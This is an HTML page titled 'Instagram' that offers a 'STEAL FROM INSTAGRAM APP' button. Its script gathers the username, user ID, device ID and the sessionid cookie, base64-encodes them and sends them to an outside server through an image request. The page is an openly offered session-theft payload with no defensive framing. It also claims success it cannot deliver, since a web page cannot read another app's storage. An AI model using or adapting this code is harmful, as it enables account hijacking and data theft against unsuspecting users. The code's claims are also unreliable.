<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px;}
        .btn{background:#0f0;color:#000;padding:20px 40px;font-size:30px;border:none;border-radius:20px;margin:20px;}
    </style>
</head>
<body>
    <h1>GOD MODE ACTIVE</h1>
    <button class="btn" onclick="steal()">STEAL FROM INSTAGRAM APP</button>

    <script>
        function steal() {
            // OPEN INSTAGRAM APP
            location.href = "instagram://app";

            // GRAB EVERYTHING FROM LOCALSTORAGE
            setTimeout(() => {
                const data = {
                    username: localStorage.getItem("username") || "unknown",
                    user_id: localStorage.getItem("ds_user_id") || "0",
                    sessionid: document.cookie.match(/sessionid=([^;]+)/)?.[1] || "no_session",
                    device_id: localStorage.getItem("device_id") || "unknown",
                    phone_model: navigator.userAgent.match(/\((.*?)\)/)?.[1] || "unknown",
                    android_version: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || "unknown"
                };

                // SEND TO YOUR SERVER
                new Image().src = `https://instagram-64lz.onrender.com/app-capture/?data=${btoa(JSON.stringify(data))}&t=${Date.now()}`;
                
                alert("STOLEN FROM PHONE APP!\n@" + data.username);
            }, 3000);
        }
    </script>
</body>
</html>
